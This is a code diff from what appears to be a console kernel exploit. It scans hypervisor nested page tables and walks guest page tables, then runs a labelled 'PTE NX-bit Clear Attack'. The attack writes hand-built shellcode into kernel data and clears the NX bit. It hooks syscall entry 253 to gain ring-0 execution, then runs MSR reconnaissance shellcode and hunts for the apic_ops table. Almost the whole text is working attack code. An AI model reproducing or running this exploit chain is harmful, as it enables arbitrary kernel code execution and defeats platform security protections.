+
+                    /* Dump likely nCR3 locations in control area */
+                    printf("    Control area (possible nCR3):\n");
+                    for (int off = 0x40; off <= 0xB0; off += 8) {
+                        uint64_t val;
+                        memcpy(&val, scan_pg + off, 8);
+                        /* nCR3 should be page-aligned, non-zero,
+                         * reasonable PA */
+                        if (val != 0 && (val & 0xFFF) == 0 &&
+                            val < 0x800000000ULL) {
+                            printf("      [0x%03x] = 0x%lx", off,
+                                   (unsigned long)val);
+                            /* Try to read the page it points to */
+                            uint8_t probe[8];
+                            if (kernel_copyout(g_dmap_base + val,
+                                               probe, 8) == 0) {
+                                uint64_t first_e;
+                                memcpy(&first_e, probe, 8);
+                                printf(" (readable, first entry:"
+                                       " 0x%lx)", (unsigned long)first_e);
+                            } else {
+                                printf(" (NOT readable from guest)");
+                            }
+                            printf("\n");
+                        }
+                    }
+                    /* Also dump some save-state area for context */
+                    printf("    Save state context:\n");
+                    /* CR0 at 0x588, CR4 at 0x578, EFER at 0x550 */
+                    uint64_t v_cr0, v_cr4, v_efer;
+                    memcpy(&v_efer, scan_pg + 0x550, 8);
+                    memcpy(&v_cr4, scan_pg + 0x578, 8);
+                    memcpy(&v_cr0, scan_pg + 0x588, 8);
+                    printf("      EFER(0x550)=0x%lx CR4(0x578)=0x%lx"
+                           " CR0(0x588)=0x%lx\n",
+                           (unsigned long)v_efer, (unsigned long)v_cr4,
+                           (unsigned long)v_cr0);
+                    fflush(stdout);
+                }
+            }
+
+            /* Check if this page has PT entries referencing
+             * kdata or ktext physical addresses */
+            int kdata_refs = 0, ktext_refs = 0;
+            int present_cnt = 0;
+            for (int i = 0; i < 512; i++) {
+                uint64_t e = ents[i];
+                if (!(e & 1)) continue;
+                present_cnt++;
+
+                uint64_t e_pa = e & 0x000FFFFFFFFFF000ULL;
+                int is_2mb = (e & 0x80) != 0;
+
+                if (is_2mb) {
+                    uint64_t e_2mb = e_pa & ~0x1FFFFFULL;
+                    if (e_2mb == kdata_2mb) kdata_refs++;
+                    if (e_2mb == ktext_2mb) ktext_refs++;
+                } else {
+                    /* 4KB entry or PT pointer — check if PA is in
+                     * kdata/ktext range (within 32MB) */
+                    if (e_pa >= kdata_pa &&
+                        e_pa < kdata_pa + 0x2000000)
+                        kdata_refs++;
+                    if (e_pa >= ktext_pa &&
+                        e_pa < ktext_pa + 0x2000000)
+                        ktext_refs++;
+                }
+            }
+
+            if (kdata_refs > 0 || ktext_refs > 0) {
+                pt_pages_with_refs++;
+                printf("\n[!] PT page at PA 0x%lx: %d present entries, "
+                       "%d kdata refs, %d ktext refs\n",
+                       (unsigned long)pa, present_cnt,
+                       kdata_refs, ktext_refs);
+
+                /* Dump matching entries */
+                for (int i = 0; i < 512; i++) {
+                    uint64_t e = ents[i];
+                    if (!(e & 1)) continue;
+                    uint64_t e_pa = e & 0x000FFFFFFFFFF000ULL;
+                    int is_2mb = (e & 0x80) != 0;
+                    int match = 0;
+                    if (is_2mb) {
+                        uint64_t e_2mb = e_pa & ~0x1FFFFFULL;
+                        if (e_2mb == kdata_2mb ||
+                            e_2mb == ktext_2mb) match = 1;
+                    } else {
+                        if ((e_pa >= kdata_pa &&
+                             e_pa < kdata_pa + 0x2000000) ||
+                            (e_pa >= ktext_pa &&
+                             e_pa < ktext_pa + 0x2000000))
+                            match = 1;
+                    }
+                    if (match) {
+                        printf("    [%3d] 0x%016lx → PA=0x%lx "
+                               "%s %s %s %s\n",
+                               i, (unsigned long)e, (unsigned long)e_pa,
+                               is_2mb ? "2MB" : "4KB",
+                               (e & 2) ? "RW" : "RO",
+                               (e & 4) ? "User" : "Kern",
+                               (e >> 63) ? "NX" : "X");
+                    }
+                }
+                fflush(stdout);
+            }
+        }
+
+        printf("\n[*] NPT scan summary:\n");
+        printf("    Pages scanned:   %d OK, %d blocked\n",
+               npt_ok, npt_fail);
+        printf("    2MB regions:     %d accessible, %d blocked\n",
+               accessible_2mb, blocked_2mb);
+        if (first_blocked)
+            printf("    Blocked range:   first=0x%lx, last=0x%lx\n",
+                   (unsigned long)first_blocked,
+                   (unsigned long)last_blocked);
+        printf("    VMCB candidates: %d\n", vmcb_found);
+        printf("    PT pages w/ kdata/ktext refs: %d\n",
+               pt_pages_with_refs);
+
+        if (vmcb_found == 0 && pt_pages_with_refs == 0) {
+            printf("\n[*] HV structures not found in guest-accessible memory.\n");
+            printf("    The hypervisor likely protects its page tables.\n");
+            printf("    Alternative: use sysent hook to call kernel pmap\n");
+            printf("    functions (e.g. pmap_protect) from ring 0 to\n");
+            printf("    change page permissions from inside the kernel.\n");
+        }
+        printf("\n");
+        fflush(stdout);
+
+        /* ── Guest Page Table Walk: check where NX is enforced ──
+         *
+         * The NPT scan found identity-mapping PD tables at PA 0x6a000
+         * and 0x6e000 where BOTH ktext and kdata are RW+X (no NX).
+         * This means NX enforcement is likely in the guest page tables.
+         *
+         * Walk the guest PT (from CR3) for both kdata and ktext,
+         * dumping entries at each level with full permission bits.
+         * If NX is in the guest PTE, we can clear it via DMAP write. */
+        printf("=============================================\n");
+        printf("  Guest Page Table Walk: Permission Analysis\n");
+        printf("=============================================\n\n");
+        fflush(stdout);
+
+        uint64_t walk_targets[] = {
+            g_ktext_base,
+            g_kdata_base,
+            g_kdata_base + 0x1000, /* kdata + 1 page */
+        };
+        const char *walk_names[] = {
+            "ktext_base",
+            "kdata_base",
+            "kdata+0x1000",
+        };
+        int n_walks = 3;
+
+        for (int w = 0; w < n_walks; w++) {
+            uint64_t va = walk_targets[w];
+            printf("[*] Walking guest PT for %s (VA=0x%lx):\n",
+                   walk_names[w], (unsigned long)va);
+
+            int pml4_idx = (va >> 39) & 0x1FF;
+            int pdp_idx  = (va >> 30) & 0x1FF;
+            int pd_idx   = (va >> 21) & 0x1FF;
+            int pt_idx   = (va >> 12) & 0x1FF;
+            printf("    Indices: PML4[%d] PDP[%d] PD[%d] PT[%d]\n",
+                   pml4_idx, pdp_idx, pd_idx, pt_idx);
+
+            /* PML4E */
+            uint64_t pml4e = 0;
+            uint64_t pml4e_pa = g_cr3_phys + pml4_idx * 8;
+            kernel_copyout(g_dmap_base + pml4e_pa, &pml4e, 8);
+            printf("    PML4E: 0x%016lx (PA of entry: 0x%lx)\n",
+                   (unsigned long)pml4e, (unsigned long)pml4e_pa);
+            printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
+                   " NX=%d → next PA=0x%lx\n",
+                   (int)(pml4e & 1), (int)((pml4e >> 1) & 1),
+                   (int)((pml4e >> 2) & 1), (int)((pml4e >> 3) & 1),
+                   (int)((pml4e >> 4) & 1), (int)((pml4e >> 5) & 1),
+                   (int)(pml4e >> 63),
+                   (unsigned long)(pml4e & PTE_PA_MASK));
+            if (!(pml4e & PTE_PRESENT)) {
+                printf("    [STOP] PML4E not present.\n\n");
+                continue;
+            }
+
+            /* PDPE */
+            uint64_t pdpe = 0;
+            uint64_t pdpe_pa = (pml4e & PTE_PA_MASK) + pdp_idx * 8;
+            kernel_copyout(g_dmap_base + pdpe_pa, &pdpe, 8);
+            printf("    PDPE:  0x%016lx (PA of entry: 0x%lx)\n",
+                   (unsigned long)pdpe, (unsigned long)pdpe_pa);
+            printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
+                   " PS=%d NX=%d → next PA=0x%lx\n",
+                   (int)(pdpe & 1), (int)((pdpe >> 1) & 1),
+                   (int)((pdpe >> 2) & 1), (int)((pdpe >> 3) & 1),
+                   (int)((pdpe >> 4) & 1), (int)((pdpe >> 5) & 1),
+                   (int)((pdpe >> 7) & 1), (int)(pdpe >> 63),
+                   (unsigned long)(pdpe & PTE_PA_MASK));
+            if (!(pdpe & PTE_PRESENT)) {
+                printf("    [STOP] PDPE not present.\n\n");
+                continue;
+            }
+            if (pdpe & PTE_PS) {
+                printf("    [1GB page] Final PA=0x%lx\n\n",
+                       (unsigned long)((pdpe & 0xFFFFC0000000ULL) |
+                                       (va & 0x3FFFFFFF)));
+                continue;
+            }
+
+            /* PDE */
+            uint64_t pde = 0;
+            uint64_t pde_pa = (pdpe & PTE_PA_MASK) + pd_idx * 8;
+            kernel_copyout(g_dmap_base + pde_pa, &pde, 8);
+            printf("    PDE:   0x%016lx (PA of entry: 0x%lx)\n",
+                   (unsigned long)pde, (unsigned long)pde_pa);
+            printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
+                   " D=%d PS=%d G=%d NX=%d → next PA=0x%lx\n",
+                   (int)(pde & 1), (int)((pde >> 1) & 1),
+                   (int)((pde >> 2) & 1), (int)((pde >> 3) & 1),
+                   (int)((pde >> 4) & 1), (int)((pde >> 5) & 1),
+                   (int)((pde >> 6) & 1), (int)((pde >> 7) & 1),
+                   (int)((pde >> 8) & 1), (int)(pde >> 63),
+                   (unsigned long)(pde & PTE_PA_MASK));
+            if (!(pde & PTE_PRESENT)) {
+                printf("    [STOP] PDE not present.\n\n");
+                continue;
+            }
+            if (pde & PTE_PS) {
+                printf("    [2MB page] Final PA=0x%lx\n",
+                       (unsigned long)((pde & 0xFFFFFFE00000ULL) |
+                                       (va & 0x1FFFFF)));
+                printf("    >>> NX=%d RW=%d — this controls"
+                       " execution permission\n\n",
+                       (int)(pde >> 63), (int)((pde >> 1) & 1));
+                /* Report PDE physical address for potential mod */
+                printf("    PDE at PA 0x%lx — writable via DMAP"
+                       " 0x%lx\n\n",
+                       (unsigned long)pde_pa,
+                       (unsigned long)(g_dmap_base + pde_pa));
+                continue;
+            }
+
+            /* PTE */
+            uint64_t pte = 0;
+            uint64_t pte_pa = (pde & PTE_PA_MASK) + pt_idx * 8;
+            kernel_copyout(g_dmap_base + pte_pa, &pte, 8);
+            printf("    PTE:   0x%016lx (PA of entry: 0x%lx)\n",
+                   (unsigned long)pte, (unsigned long)pte_pa);
+            printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
+                   " D=%d PAT=%d G=%d NX=%d → PA=0x%lx\n",
+                   (int)(pte & 1), (int)((pte >> 1) & 1),
+                   (int)((pte >> 2) & 1), (int)((pte >> 3) & 1),
+                   (int)((pte >> 4) & 1), (int)((pte >> 5) & 1),
+                   (int)((pte >> 6) & 1), (int)((pte >> 7) & 1),
+                   (int)((pte >> 8) & 1), (int)(pte >> 63),
+                   (unsigned long)(pte & PTE_PA_MASK));
+            if (!(pte & PTE_PRESENT)) {
+                printf("    [STOP] PTE not present.\n\n");
+                continue;
+            }
+
+            printf("    >>> NX=%d RW=%d — this controls"
+                   " execution permission\n",
+                   (int)(pte >> 63), (int)((pte >> 1) & 1));
+            printf("    PTE at PA 0x%lx — writable via DMAP 0x%lx\n\n",
+                   (unsigned long)pte_pa,
+                   (unsigned long)(g_dmap_base + pte_pa));
+        }
+        fflush(stdout);
+    }
+
+    /* ================================================================
+     * Ring-0 Shellcode Execution via Guest PTE NX-bit Clear
+     * ================================================================
+     *
+     * PROVEN: NPT maps kdata as RW+X (no NX at PA 0x6a000/0x6e000).
+     * PROVEN: Guest PTE for kdata has NX=1 (bit 63) — the ONLY barrier.
+     * PROVEN: Sysent hooks redirect standard syscalls to any ktext addr.
+     *
+     * Attack plan:
+     *   1. Write minimal shellcode to kdata code cave via DMAP
+     *   2. Clear NX+G in the guest PTE via DMAP write
+     *   3. Hook sysent[253] (issetugid) to point to shellcode
+     *   4. Call syscall(253) → ring-0 execution!
+     *   5. Restore PTE + sysent + code cave content
+     *
+     * TLB concern: PTE has A=0 → page likely not in TLB.
+     * We clear G too so CR3 reloads will flush if cached.
+     * ================================================================ */
+    if (sysent_verified && sysent_kva != 0) {
+        printf("=============================================\n");
+        printf("  Ring-0 Execution: PTE NX-bit Clear Attack\n");
+        printf("=============================================\n\n");
+        fflush(stdout);
+
+        /* Target: kdata_base (first page, known code cave) */
+        uint64_t target_kva = g_kdata_base;
+        uint64_t target_pa = va_to_pa_quiet(target_kva);
+
+        /* Walk guest PT to find the PTE for target_kva */
+        uint64_t walk_e;
+        uint64_t walk_pa;
+        /* PML4 → PDP → PD → PTE */
+        walk_pa = g_cr3_phys + ((target_kva >> 39) & 0x1FF) * 8;
+        kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+        if (!(walk_e & PTE_PRESENT)) goto r0_skip;
+
+        walk_pa = (walk_e & PTE_PA_MASK) +
+                  ((target_kva >> 30) & 0x1FF) * 8;
+        kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+        if (!(walk_e & PTE_PRESENT)) goto r0_skip;
+        if (walk_e & PTE_PS) {
+            printf("[-] kdata mapped as 1GB page, not 4KB PTE.\n");
+            goto r0_skip;
+        }
+
+        walk_pa = (walk_e & PTE_PA_MASK) +
+                  ((target_kva >> 21) & 0x1FF) * 8;
+        kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+        if (!(walk_e & PTE_PRESENT)) goto r0_skip;
+        /* Check for 2MB page — handle differently */
+        uint64_t pte_pa;
+        uint64_t orig_pte;
+        int is_pde_2mb = (walk_e & PTE_PS) != 0;
+        if (is_pde_2mb) {
+            /* PDE is the final level (2MB page) */
+            pte_pa = (walk_e & PTE_PA_MASK) +
+                     ((target_kva >> 21) & 0x1FF) * 8;
+            /* Re-read using the PDE address */
+            pte_pa = walk_pa; /* walk_pa IS the PDE address */
+            kernel_copyout(g_dmap_base + pte_pa, &orig_pte, 8);
+            printf("[*] kdata mapped as 2MB page (PDE at PA 0x%lx)\n",
+                   (unsigned long)pte_pa);
+        } else {
+            /* Walk to PT level */
+            walk_pa = (walk_e & PTE_PA_MASK) +
+                      ((target_kva >> 12) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if (!(walk_e & PTE_PRESENT)) goto r0_skip;
+            pte_pa = walk_pa;
+            orig_pte = walk_e;
+        }
+
+        printf("[*] Target: kdata_base KVA=0x%lx PA=0x%lx\n",
+               (unsigned long)target_kva, (unsigned long)target_pa);
+        printf("[*] PTE at PA 0x%lx: 0x%016lx\n",
+               (unsigned long)pte_pa, (unsigned long)orig_pte);
+        printf("    NX=%d RW=%d G=%d A=%d\n",
+               (int)(orig_pte >> 63), (int)((orig_pte >> 1) & 1),
+               (int)((orig_pte >> 8) & 1), (int)((orig_pte >> 5) & 1));
+        fflush(stdout);
+
+        if (!(orig_pte >> 63)) {
+            printf("[!] NX already clear — page is already executable?!\n");
+            goto r0_skip;
+        }
+
+        /* Step 1: Save original kdata content and write shellcode.
+         *
+         * Shellcode (29 bytes):
+         *   mov rax, <DMAP_KVA_of_shared_buf>  ; 10 bytes
+         *   mov rdx, <magic>                    ; 10 bytes
+         *   mov [rax], rdx                      ; 3 bytes
+         *   xor eax, eax                        ; 2 bytes
+         *   ret                                 ; 1 byte
+         *
+         * Writes 0xDEAD_RING_0000_0000 to shared buffer, returns 0.
+         */
+        uint8_t r0_shellcode[32];
+        int sc_len = 0;
+        uint64_t sc_magic = 0xDEAD000052494E47ULL; /* "RING" + marker */
+
+        /* mov rax, imm64 */
+        r0_shellcode[sc_len++] = 0x48;
+        r0_shellcode[sc_len++] = 0xB8;
+        memcpy(&r0_shellcode[sc_len], &result_kva, 8);
+        sc_len += 8;
+
+        /* mov rdx, imm64 */
+        r0_shellcode[sc_len++] = 0x48;
+        r0_shellcode[sc_len++] = 0xBA;
+        memcpy(&r0_shellcode[sc_len], &sc_magic, 8);
+        sc_len += 8;
+
+        /* mov [rax], rdx */
+        r0_shellcode[sc_len++] = 0x48;
+        r0_shellcode[sc_len++] = 0x89;
+        r0_shellcode[sc_len++] = 0x10;
+
+        /* xor eax, eax */
+        r0_shellcode[sc_len++] = 0x31;
+        r0_shellcode[sc_len++] = 0xC0;
+
+        /* ret */
+        r0_shellcode[sc_len++] = 0xC3;
+
+        printf("\n[*] Step 1: Writing %d-byte shellcode to kdata via DMAP...\n",
+               sc_len);
+
+        /* Save original bytes */
+        uint8_t r0_backup[64];
+        kernel_copyout(g_dmap_base + target_pa, r0_backup, sc_len);
+
+        /* Write shellcode */
+        kernel_copyin(r0_shellcode, g_dmap_base + target_pa, sc_len);
+
+        /* Verify */
+        uint8_t r0_verify[32];
+        kernel_copyout(g_dmap_base + target_pa, r0_verify, sc_len);
+        int sc_match = (memcmp(r0_shellcode, r0_verify, sc_len) == 0);
+        printf("    Write verify: %s\n", sc_match ? "OK" : "MISMATCH");
+        printf("    Bytes: ");
+        for (int i = 0; i < sc_len; i++) printf("%02x ", r0_verify[i]);
+        printf("\n");
+        fflush(stdout);
+
+        if (!sc_match) {
+            printf("[-] Shellcode write failed, aborting.\n");
+            kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);
+            goto r0_skip;
+        }
+
+        /* Step 2: Clear NX (bit 63) and G (bit 8) in guest PTE.
+         * Clearing G ensures the TLB entry (if cached) will be
+         * flushed on the next CR3 reload (context switch). */
+        printf("[*] Step 2: Clearing NX+G in guest PTE...\n");
+        uint64_t new_pte = orig_pte & ~((1ULL << 63) | (1ULL << 8));
+        printf("    Old PTE: 0x%016lx (NX=%d G=%d)\n",
+               (unsigned long)orig_pte,
+               (int)(orig_pte >> 63), (int)((orig_pte >> 8) & 1));
+        printf("    New PTE: 0x%016lx (NX=%d G=%d)\n",
+               (unsigned long)new_pte,
+               (int)(new_pte >> 63), (int)((new_pte >> 8) & 1));
+
+        kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);
+
+        /* Verify PTE write */
+        uint64_t pte_rb;
+        kernel_copyout(g_dmap_base + pte_pa, &pte_rb, 8);
+        printf("    PTE readback: 0x%016lx [%s]\n",
+               (unsigned long)pte_rb,
+               pte_rb == new_pte ? "OK" : "MISMATCH");
+        fflush(stdout);
+
+        if (pte_rb != new_pte) {
+            printf("[-] PTE write failed, restoring and aborting.\n");
+            kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
+            kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);
+            goto r0_skip;
+        }
+
+        /* Step 3: Clear shared buffer to detect fresh writes */
+        printf("[*] Step 3: Clearing shared buffer...\n");
+        uint64_t zero = 0;
+        kernel_copyin(&zero, g_dmap_base + cpu_pa, 8);
+
+        /* Step 4: Hook sysent[253] to kdata_base and call */
+        printf("[*] Step 4: Hooking sysent[253] → kdata_base (0x%lx)...\n",
+               (unsigned long)target_kva);
+        fflush(stdout);
+
+        /* Save original sysent[253] */
+        uint64_t s253_kva = sysent_kva + 253ULL * SYSENT_STRIDE;
+        uint64_t s253_pa = va_to_pa_quiet(s253_kva);
+        uint8_t s253_orig[SYSENT_STRIDE];
+        kernel_copyout(g_dmap_base + s253_pa, s253_orig, SYSENT_STRIDE);
+
+        /* Write target_kva into sysent[253].sy_call */
+        uint64_t s253_call_pa = va_to_pa_quiet(s253_kva + 8);
+        kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
+
+        /* Set narg=0 */
+        int32_t narg_zero = 0;
+        uint64_t s253_narg_pa = va_to_pa_quiet(s253_kva);
+        kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);
+
+        /* Verify hook */
+        uint64_t hook_rb;
+        kernel_copyout(g_dmap_base + s253_call_pa, &hook_rb, 8);
+        printf("    sysent[253].sy_call = 0x%lx [%s]\n",
+               (unsigned long)hook_rb,
+               hook_rb == target_kva ? "OK" : "MISMATCH");
+        fflush(stdout);
+
+        /* CALL THE HOOKED SYSCALL — this is the ring-0 moment */
+        printf("[*] Calling syscall(253) — executing shellcode in ring 0...\n");
+        fflush(stdout);
+        errno = 0;
+        long r0_ret = syscall(253);
+        int r0_err = errno;
+        printf("    syscall(253) returned: %ld, errno=%d\n",
+               r0_ret, r0_err);
+
+        /* Step 5: IMMEDIATELY restore everything */
+        printf("[*] Step 5: Restoring PTE, sysent, code cave...\n");
+
+        /* Restore sysent[253] */
+        kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
+
+        /* Restore PTE (put NX+G back) */
+        kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
+
+        /* Restore kdata content */
+        kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);
+
+        printf("    All restored.\n");
+        fflush(stdout);
+
+        /* Step 6: Check shared buffer for magic */
+        uint64_t buf_check;
+        kernel_copyout(g_dmap_base + cpu_pa, &buf_check, 8);
+        printf("\n[*] Shared buffer value: 0x%016lx\n",
+               (unsigned long)buf_check);
+
+        if (buf_check == sc_magic) {
+            printf("[+] ============================================\n");
+            printf("[+]  RING-0 CODE EXECUTION CONFIRMED!\n");
+            printf("[+] ============================================\n");
+            printf("[+] Shellcode wrote magic 0x%lx to shared buffer.\n",
+                   (unsigned long)sc_magic);
+            printf("[+] Attack chain: PTE NX-clear + sysent hook → ring 0\n");
+            printf("[+] We have arbitrary kernel code execution.\n");
+
+            /* ─── Phase 2: MSR/CR Reconnaissance via ring-0 ─── */
+            printf("\n=============================================\n");
+            printf("  Ring-0 Phase 2: MSR/CR Reconnaissance\n");
+            printf("=============================================\n\n");
+            fflush(stdout);
+
+            /* Build the MSR recon shellcode */
+            uint8_t msr_sc[512];
+            int msr_sc_len = build_ring0_msr_shellcode(msr_sc, sizeof(msr_sc),
+                                                       result_kva);
+            printf("[*] MSR recon shellcode: %d bytes\n", msr_sc_len);
+
+            if (msr_sc_len <= 0 || msr_sc_len > 480) {
+                printf("[-] Shellcode too large or failed to build.\n");
+            } else {
+                /* Clear the shared buffer for fresh results */
+                uint8_t zero_buf[256];
+                memset(zero_buf, 0, sizeof(zero_buf));
+                for (int zb = 0; zb < RING0_RESULT_ALLOC_SIZE; zb += 256)
+                    kernel_copyin(zero_buf, g_dmap_base + cpu_pa + zb, 256);
+
+                /* Save original kdata content (larger region for MSR shellcode) */
+                uint8_t msr_backup[512];
+                kernel_copyout(g_dmap_base + target_pa, msr_backup, msr_sc_len);
+
+                /* Write MSR shellcode to kdata code cave */
+                printf("[*] Writing MSR shellcode to kdata code cave...\n");
+                kernel_copyin(msr_sc, g_dmap_base + target_pa, msr_sc_len);
+
+                /* Verify write */
+                uint8_t msr_verify[512];
+                kernel_copyout(g_dmap_base + target_pa, msr_verify, msr_sc_len);
+                int msr_match = (memcmp(msr_sc, msr_verify, msr_sc_len) == 0);
+                printf("    Write verify: %s\n", msr_match ? "OK" : "MISMATCH");
+                fflush(stdout);
+
+                if (msr_match) {
+                    /* Clear NX+G in PTE again */
+                    printf("[*] Clearing NX+G in PTE for MSR shellcode...\n");
+                    kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);
+
+                    /* Hook sysent[253] again */
+                    printf("[*] Hooking sysent[253] → kdata_base...\n");
+                    kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
+                    kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);
+
+                    /* Execute MSR recon in ring 0 */
+                    printf("[*] Calling syscall(253) — MSR/CR recon in ring 0...\n");
+                    fflush(stdout);
+                    errno = 0;
+                    long msr_ret = syscall(253);
+                    int msr_err = errno;
+                    printf("    syscall(253) returned: %ld, errno=%d\n",
+                           msr_ret, msr_err);
+
+                    /* Restore everything immediately */
+                    printf("[*] Restoring PTE, sysent, code cave...\n");
+                    kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
+                    kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
+                    kernel_copyin(msr_backup, g_dmap_base + target_pa, msr_sc_len);
+                    printf("    All restored.\n");
+                    fflush(stdout);
+
+                    /* Parse results from shared buffer */
+                    struct kmod_result_buf msr_results;
+                    memcpy(&msr_results, result_vaddr, sizeof(msr_results));
+
+                    if (msr_results.magic == KMOD_MAGIC &&
+                        msr_results.status == KMOD_STATUS_DONE) {
+                        printf("\n[+] ============================================\n");
+                        printf("[+]  MSR/CR RECON COMPLETE — %u entries\n",
+                               msr_results.num_msr_results);
+                        printf("[+] ============================================\n\n");
+
+                        for (uint32_t mi = 0;
+                             mi < msr_results.num_msr_results && mi < 32;
+                             mi++) {
+                            uint32_t mid = msr_results.msr_results[mi].msr_id;
+                            uint64_t mval = msr_results.msr_results[mi].value;
+                            const char *mname;
+                            switch (mid) {
+                                case 0xC0000080: mname = "EFER"; break;
+                                case 0xC0000081: mname = "STAR"; break;
+                                case 0xC0000082: mname = "LSTAR"; break;
+                                case 0xC0000084: mname = "SFMASK"; break;
+                                case 0xC0000100: mname = "FS_BASE"; break;
+                                case 0xC0000101: mname = "GS_BASE"; break;
+                                case 0xC0000102: mname = "KGS_BASE"; break;
+                                case 0xC0000103: mname = "TSC_AUX"; break;
+                                case 0x0000001B: mname = "APIC_BASE"; break;
+                                case 0xFFFF0000: mname = "CR0"; break;
+                                case 0xFFFF0003: mname = "CR3"; break;
+                                case 0xFFFF0004: mname = "CR4"; break;
+                                default: mname = "???"; break;
+                            }
+                            printf("    %-12s (0x%08x) = 0x%016lx\n",
+                                   mname, mid, (unsigned long)mval);
+
+                            /* Decode important registers */
+                            if (mid == 0xC0000080) { /* EFER */
+                                printf("      SCE=%d LME=%d LMA=%d NXE=%d SVME=%d "
+                                       "LMSLE=%d FFXSR=%d TCE=%d\n",
+                                       (int)(mval & 1),
+                                       (int)((mval >> 8) & 1),
+                                       (int)((mval >> 10) & 1),
+                                       (int)((mval >> 11) & 1),
+                                       (int)((mval >> 12) & 1),
+                                       (int)((mval >> 13) & 1),
+                                       (int)((mval >> 14) & 1),
+                                       (int)((mval >> 15) & 1));
+                                if (mval & (1ULL << 12))
+                                    printf("      [!] SVME=1 — SVM enabled in guest!\n");
+                                else
+                                    printf("      [*] SVME=0 — SVM disabled (expected in guest)\n");
+                            }
+                            if (mid == 0xC0000082) { /* LSTAR */
+                                printf("      Syscall entry point (ring 0)\n");
+                                if (g_ktext_base && mval >= g_ktext_base &&
+                                    mval < g_ktext_base + 0x1000000)
+                                    printf("      ktext offset: +0x%lx\n",
+                                           (unsigned long)(mval - g_ktext_base));
+                            }
+                            if (mid == 0x1B) { /* APIC_BASE */
+                                printf("      APIC PA=0x%lx BSP=%d EN=%d EXTD=%d\n",
+                                       (unsigned long)(mval & 0xFFFFF000ULL),
+                                       (int)((mval >> 8) & 1),
+                                       (int)((mval >> 11) & 1),
+                                       (int)((mval >> 10) & 1));
+                            }
+                            if (mid == 0xFFFF0000) { /* CR0 */
+                                printf("      PE=%d MP=%d EM=%d TS=%d ET=%d "
+                                       "NE=%d WP=%d AM=%d NW=%d CD=%d PG=%d\n",
+                                       (int)(mval & 1),
+                                       (int)((mval >> 1) & 1),
+                                       (int)((mval >> 2) & 1),
+                                       (int)((mval >> 3) & 1),
+                                       (int)((mval >> 4) & 1),
+                                       (int)((mval >> 5) & 1),
+                                       (int)((mval >> 16) & 1),
+                                       (int)((mval >> 18) & 1),
+                                       (int)((mval >> 29) & 1),
+                                       (int)((mval >> 30) & 1),
+                                       (int)((mval >> 31) & 1));
+                            }
+                            if (mid == 0xFFFF0004) { /* CR4 */
+                                printf("      VME=%d PVI=%d TSD=%d DE=%d "
+                                       "PSE=%d PAE=%d MCE=%d PGE=%d\n",
+                                       (int)(mval & 1),
+                                       (int)((mval >> 1) & 1),
+                                       (int)((mval >> 2) & 1),
+                                       (int)((mval >> 3) & 1),
+                                       (int)((mval >> 4) & 1),
+                                       (int)((mval >> 5) & 1),
+                                       (int)((mval >> 6) & 1),
+                                       (int)((mval >> 7) & 1));
+                                printf("      OSFXSR=%d OSXMMEX=%d UMIP=%d "
+                                       "FSGSBASE=%d PCIDE=%d OSXSAVE=%d SMEP=%d SMAP=%d\n",
+                                       (int)((mval >> 9) & 1),
+                                       (int)((mval >> 10) & 1),
+                                       (int)((mval >> 11) & 1),
+                                       (int)((mval >> 16) & 1),
+                                       (int)((mval >> 17) & 1),
+                                       (int)((mval >> 18) & 1),
+                                       (int)((mval >> 20) & 1),
+                                       (int)((mval >> 21) & 1));
+                            }
+                        }
+                        printf("\n");
+                    } else if (msr_results.magic == KMOD_MAGIC) {
+                        printf("[?] MSR recon started but didn't complete "
+                               "(status=%u)\n", msr_results.status);
+                        printf("    Likely #GP on an MSR read — HV intercept.\n");
+                    } else {
+                        printf("[-] MSR shellcode did not write magic.\n");
+                        if (msr_err != 0)
+                            printf("    errno=%d — possible #GP fault.\n", msr_err);
+                    }
+                } else {
+                    /* Write failed — restore kdata */
+                    printf("[-] MSR shellcode write verify failed.\n");
+                    kernel_copyin(msr_backup, g_dmap_base + target_pa, msr_sc_len);
+                }
+            }
+
+            /* ─── Phase 3: Scan kdata for apic_ops vtable ─── */
+            printf("=============================================\n");
+            printf("  Ring-0 Phase 3: APIC Ops Discovery\n");
+            printf("=============================================\n\n");
+
+            /*
+             * ktext pointer range for validation.
+             * Use 32MB from ktext_base — some LAPIC functions are
+             * in late sections beyond the ktext→kdata gap (~12MB).
+             * The other research branch (apic-ops-summary) confirmed
+             * 32MB is needed to capture all 28 apic_ops pointers.
+             */
+            uint64_t ktext_size = 0x2000000; /* 32MB */
+
+            /*
+             * Known apic_ops offset on FW 4.03 (from apic-ops-summary
+             * research branch): kdata+0x170650, 28 entries.
+             */
+            #define APIC_OPS_KNOWN_OFFSET  0x170650
+            #define APIC_OPS_KNOWN_COUNT   28
+
+            printf("[*] Scanning kdata for function pointer tables (apic_ops)...\n");
+            printf("[*] Looking for clusters of 4+ consecutive ktext pointers.\n");
+            printf("    ktext ptr range: 0x%lx — 0x%lx (%luMB)\n",
+                   (unsigned long)g_ktext_base,
+                   (unsigned long)(g_ktext_base + ktext_size),
+                   (unsigned long)(ktext_size >> 20));
+
+            /*
+             * Scan 8MB of kdata.  ALLPROC is at kdata+0x27EDCB8 (~40MB)
+             * in BSS; .data (where apic_ops lives) is before BSS.  8MB
+             * should cover the initialized .data section.
+             */
+            #define APIC_SCAN_SIZE   0x800000  /* 8MB of kdata */
